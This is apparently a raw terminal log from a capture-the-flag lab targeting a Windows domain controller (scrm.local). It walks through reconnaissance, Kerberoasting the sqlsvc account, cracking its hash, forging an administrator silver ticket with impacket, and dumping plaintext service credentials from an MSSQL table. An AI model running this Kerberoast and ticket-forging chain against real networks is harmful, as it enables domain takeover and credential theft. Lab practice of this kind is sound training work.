└─$ nmap -p- -sSCV 10.129.186.240  --min-rate 999   
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-22 03:17:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-22T02:33:38
|_Not valid after:  2056-01-22T02:33:38
|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.186.240:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows


http://10.129.186.240/salesorders.html
dc1.scrm.local 4411

└─$ nmap -sU  -p 4411 10.129.186.240  --min-rate 999
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 13:52 AEDT
Nmap scan report for 10.129.186.240
Host is up (0.079s latency).

PORT     STATE         SERVICE
4411/udp open|filtered unknown

└─$ ldapsearch -x -H ldap://10.129.186.240 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=scrm,DC=local
namingcontexts: CN=Configuration,DC=scrm,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

└─$ impacket-GetADUsers -all scrm.local/ksimpson -dc-host dc1.scrm.local -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Querying dc1.scrm.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
administrator                                         2021-11-08 11:35:59.979923  2026-01-23 18:11:18.016064 
Guest                                                 <never>              <never>             
krbtgt                                                2020-01-27 06:15:47.464029  <never>             
tstar                                                 2021-11-06 01:55:51.051205  2021-11-06 01:53:01.788267 
asmith                                                2020-02-09 09:29:01.510215  <never>             
sjenkins                                              2020-02-09 10:11:26.334926  <never>             
sdonington                                            2020-02-09 10:11:54.413038  <never>             
backupsvc                                             2021-11-01 07:49:04.491305  <never>             
jhall                                                 2021-11-01 08:09:23.755345  <never>             
rsmith                                                2021-11-01 08:09:54.865219  <never>             
ehooker                                               2021-11-04 06:02:41.722494  2021-11-04 06:03:02.522126 
khicks                                                2021-11-02 02:36:08.897478  <never>             
sqlsvc                                                2021-11-04 03:32:02.351452  2026-01-23 18:29:12.229586 
miscsvc                                               2021-11-04 05:07:47.993436  2022-05-30 22:37:41.376125 
ksimpson                                              2021-11-04 11:30:57.166952  2026-01-23 18:49:59.448329 


└─$ impacket-GetADUsers -all scrm.local/ksimpson -dc-ip 10.129.186.240
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos authentication instead.
[-] Error in bindRequest during the NTLMAuthNegotiate request -> invalidCredentials: 80090302: LdapErr: DSID-0C09058A, comment: AcceptSecurityContext error, data 1, v4563

└─$ impacket-getTGT scrm.local/ksimpson -dc-ip 10.129.186.240
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in ksimpson.ccache

└─$ impacket-smbclient -k scrm.local/ksimpson:ksimpson:ksimpson@dc1.scrm.local -dc-ip dc1.scrm.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 reconnect - reconnect connection, useful for broken pipes & interrupted sessions
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)



# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use HR
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use ADMIN$
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use IT
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Sales
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Public
# ls
drw-rw-rw-          0  Fri Nov  5 09:23:19 2021 .
drw-rw-rw-          0  Fri Nov  5 09:23:19 2021 ..
-rw-rw-rw-     630106  Sat Nov  6 04:45:07 2021 Network Security Changes.pdf

# mget Network Security Changes.pdf
[*] Downloading Network Security Changes.pdf

SQL database used by our HR software
so we have removed all access to the SQL service for everyone apart from network administrators.



└─$ impacket-GetUserSPNs -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -request  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-04 03:32:02.351452  2026-01-23 18:29:12.229586             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-04 03:32:02.351452  2026-01-23 18:29:12.229586             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$b13625a0c9dea85dd8d62e6bd2171736$f049bb6930307abdf62ec4ae36bdc552bfdce651d207260b6053ae2787241d114412c364ca8efc3fbf6686fefb12bd41c6d370b3d37c93d758cf4b5d18965664f9e03516bb0169ace73e292316f2a4d3705ed354c828e10c84e2f4fe8e2884cb1b012c40e72224f438802cd4dc555ae9e18ced2d0743c719c78f59d6d0e2526665185c59584f609977ab505ac4dd1134ed945c98b2a356f988340bde18ef7e6582cbf92bdac69665aa1b72dc1f3b43883ac8bc6c0f4e1d8e22576a84db1d67aa13f55e5fcb18567390f0944c90e850e03d2dbce212a6746d85001b2571a4a305ccb734a6c05f559d63bda292090e9d58e60b859a9bc19702980fe982a57b0a6fd0fda9c484a509d5a9f12dbca6d487972d6f040a6d26b22b9cd0a1b6d70c54a3ecc1a87b4f170e15ad65d304604f4b54b012be8341793c5f780ed6424aad2f601a1f04d55a29159b8e20c21685807ab35212246562b08f81c210f7d46c47e492da2a458f0e3a208601cfb6cf053b571d53733691446857bf655553ec850eb24548b8719d00c34ab7a6deebaa2c90dda7ab689ed7afa1d5e14c4a6978c0a06e2c1dbed5848c95eecada96e2a6f5493bd38cd17ced11b17643932ce84e77062fa6ab858d6201b9fdde64fb3d1a8230423334d03d3f97bf6760717514b60e497f188740747387b7cc4eae43a94e55563c7e381f6e960a4c554f60fe66cdb53cf7043992f8c826b4565e470c71f1a8b8691e4ae6a1495032eeebf77baad36a20b00aa68b0a96f7e7e54a0cbd5d2ffc7508c933ba08a20eb0842d7f054dcf56be1d70fbb31a36e9394ad56ca7bcbd5d57fd371cea6fc23c2f5fe789e608ec43710649f2405a18ea0f2c51f003b7d4c00de191d9e70f37ac6543058963c6e984c147f6ae058b0ae822b6e1a6b48f5f3d923f1a777de7d7f67b8a52e83a82ac70fadebaf60ac9a1336705496a0f508207346c62a780812c8cd97ff5084f93d0d3cacecd7d16ab1fca8552a7ff0cb84b720c044b85b16e8839581ee31d9e034006760f7f3be85695e276e97ad6cc4a6f3404360fdc846cce1d7ece9fdc8895e78fdad5a0cd178f6ebbbf65bd85cef9c287b2e9ecf8443d94a58757130c33d30eb6f353452fcd0ecadef7131f46ab499d28251ac80cfdacc8d102b16eccba13b267eb845ee500fe3cff71fb4f2d80eee3241dcc907e33c08b11a059641e933402d1e156ece760481991f2145f3b8dcff8b69a5212c3c0fb49c15d6bbcf46ea8d0e0f7c4ded46a02f1605845892e2fe71c9908d652e70c5d2d3fc0be962f667e5b00306723ce13d2a567949dd46817c13b21b1daa8ef6a115ee7d95d50e1cc5ad242dbf7390f92b74fb4d12aab372c6edff21dd0d53232e714f2ad24bb5b58b09d46bffa2c6d1933fae87e411cda04c99dac6e86b875342bfce62f109b93c2f5

─$ hashcat -m 13100 -a 0 hash ~/tools/rockyou.txt 
f6561ffc5995412606f4ef42daa2815:Pegasus60
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)

sqlsvc Pegasus60

get the SID of domain
└─$ netexec ldap 10.129.187.157 -u sqlsvc -p Pegasus60 -k --get-sid
LDAP        10.129.187.157  389    DC1              [*] None (name:DC1) (domain:scrm.local)
LDAP        10.129.187.157  389    DC1              [+] scrm.local\sqlsvc:Pegasus60 
LDAP        10.129.187.157  389    DC1              Domain SID S-1-5-21-2743207045-1827831105-2542523200

method2 
─$ impacket-getPac -targetUser administrator scrm.local/sqlsvc:Pegasus60 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

KERB_VALIDATION_INFO 
LogonTime:                      
    dwLowDateTime:                   2014798467 
    dwHighDateTime:                  31231031 
LogoffTime:                     
    dwLowDateTime:                   4294967295 
    dwHighDateTime:                  2147483647 
KickOffTime:                    
    dwLowDateTime:                   4294967295 
    dwHighDateTime:                  2147483647 
PasswordLastSet:                
    dwLowDateTime:                   2585823167 
    dwHighDateTime:                  30921784 
PasswordCanChange:              
    dwLowDateTime:                   3297396671 
    dwHighDateTime:                  30921985 
PasswordMustChange:             
    dwLowDateTime:                   4294967295 
    dwHighDateTime:                  2147483647 
EffectiveName:                   'administrator' 
FullName:                        '' 
LogonScript:                     '' 
ProfilePath:                     '' 
HomeDirectory:                   '' 
HomeDirectoryDrive:              '' 
LogonCount:                      272 
BadPasswordCount:                0 
UserId:                          500 
PrimaryGroupId:                  513 
GroupCount:                      5 
GroupIds:                       
    [
         
        RelativeId:                      513 
        Attributes:                      7 ,
         
        RelativeId:                      512 
        Attributes:                      7 ,
         
        RelativeId:                      520 
        Attributes:                      7 ,
         
        RelativeId:                      518 
        Attributes:                      7 ,
         
        RelativeId:                      519 
        Attributes:                      7 ,
    ] 
UserFlags:                       544 
UserSessionKey:                 
    Data:                            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 
LogonServer:                     'DC1' 
LogonDomainName:                 'SCRM' 
LogonDomainId:                  
    Revision:                        1 
    SubAuthorityCount:               4 
    IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05' 
    SubAuthority:                   
        [
             21,
             2743207045,
             1827831105,
             2542523200,
        ] 
LMKey:                           b'\x00\x00\x00\x00\x00\x00\x00\x00' 
UserAccountControl:              16912 
SubAuthStatus:                   0 
LastSuccessfulILogon:           
    dwLowDateTime:                   0 
    dwHighDateTime:                  0 
LastFailedILogon:               
    dwLowDateTime:                   0 
    dwHighDateTime:                  0 
FailedILogonCount:               0 
Reserved3:                       0 
SidCount:                        1 
ExtraSids:                      
    [
         
        Sid:                            
            Revision:                        1 
            SubAuthorityCount:               1 
            IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x12' 
            SubAuthority:                   
                [
                     2,
                ] 
        Attributes:                      7 ,
    ] 
ResourceGroupDomainSid:         
    Revision:                        1 
    SubAuthorityCount:               4 
    IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05' 
    SubAuthority:                   
        [
             21,
             2743207045,
             1827831105,
             2542523200,
        ] 
ResourceGroupCount:              1 
ResourceGroupIds:               
    [
         
        RelativeId:                      572 
        Attributes:                      536870919 ,
    ] 
Domain SID: S-1-5-21-2743207045-1827831105-2542523200


└─$ impacket-getST -k -spn MSSQLSvc/dc1.scrm.local scrm.local/sqlsvc:Pegasus60@dc1.scrm.local -dc-ip dc1.scrm.local 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in sqlsvc@MSSQLSvc_dc1.scrm.local@SCRM.LOCAL.ccache


first of all we have to
destroy our previous ticket as ksimpson using kdestroy

└─$ export KRB5CCNAME=sqlsvc@MSSQLSvc_dc1.scrm.local@SCRM.LOCAL.ccache 
                                                                                                              
┌──(ed㉿kali)-[/tmp]
└─$ klist     
Ticket cache: FILE:sqlsvc@MSSQLSvc_dc1.scrm.local@SCRM.LOCAL.ccache
Default principal: ksimpson@SCRM.LOCAL

Valid starting     Expires            Service principal
01/23/26 19:01:13  01/24/26 04:49:59  MSSQLSvc/dc1.scrm.local@SCRM.LOCAL
	renew until 01/24/26 18:49:59


└─$ impacket-ticketer administrator -spn MSSQLSvc/dc1.scrm.local -dc-ip dc1.scrm.local -user sqlsvc -password Pegasus60 -nthash B999A16500B87D17EC7F2E2A68778F05 -domain dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for dc1.scrm.local/administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in administrator.ccache

└─$ impacket-mssqlclient -k dc1.scrm.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> show databases
ERROR(DC1): Line 1: Could not find stored procedure 'show'.
SQL (SCRM\administrator  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (SCRM\administrator  dbo@master)> enum_db
name         is_trustworthy_on   
----------   -----------------   
master                       0   
tempdb                       0   
model                        0   
msdb                         1   
ScrambleHR                   0   

SQL (SCRM\administrator  dbo@ScrambleHR)> select table_name from INFORMATION_SCHEMA.TABLES;
table_name   
----------   
Employees    
UserImport   
Timesheets   

SQL (SCRM\administrator  dbo@ScrambleHR)> select * from Employees;
EmployeeID   FirstName   Surname   Title   Manager   Role   
----------   ---------   -------   -----   -------   ----   
SQL (SCRM\administrator  dbo@ScrambleHR)> select * from UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0 

─$ pwsh
PowerShell 7.5.2

┌──(ed㉿kali)-[/home/ed]
└─PS> Enter-PSSession dc1.scrm.local -Credential MiscSvc

PowerShell credential request
Enter your credentials.
Password for user MiscSvc: *************

Enter-PSSession: This parameter set requires WSMan, and no supported WSMan client library was found. WSMan is either not installed or unavailable for this system.

└─$ sudo pwsh
[sudo] password for ed: 
PowerShell 7.5.2

   A new PowerShell stable release is available: v7.5.4 
   Upgrade now, or check out the release page at:       
     https://aka.ms/PowerShell-Release?tag=v7.5.4       

PS /home/ed> Install-Module -Name PSWSMan -Scope AllUsers      
PS /home/ed> Install-WSMan                                     
WARNING: WSMan libs have been installed, please restart your PowerShell session to enable it in PowerShell    
PS /home/ed> exit
